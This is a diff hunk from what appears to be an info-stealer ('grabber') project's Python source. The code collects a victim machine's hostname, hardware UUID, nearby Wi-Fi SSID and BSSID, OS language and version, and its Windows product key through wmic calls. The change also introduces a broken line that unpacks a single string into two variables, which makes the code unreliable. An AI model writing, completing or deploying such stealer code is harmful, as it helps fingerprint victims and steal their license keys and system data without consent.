@@ -55,14 +55,18 @@ hostname = str(os.environ['COMPUTERNAME'])
 hwid = str(subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8"))
 wifi_interfaces = pywifi.PyWiFi().interfaces()
 iface = wifi_interfaces[0] if wifi_interfaces else None
-if iface is not None:
+ssid, bssid = "No result"
+if iface:
     iface.scan()
     for result in iface.scan_results():
-        ssid = result.ssid
-        bssid = result.bssid
-else:
-    ssid = "No result"
-    bssid = "No result"
+        try:
+            ssid = result.ssid
+            bssid = result.bssid
+        except:
+            pass 
+            # For some reason this may result in an error (https://github.com/DamagingRose/Rose-Grabber/issues/167)
+            # pywifi/profile.py already initializes an SSID variable, so why this happens in unknown.
+
 lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
 system = str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1])
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
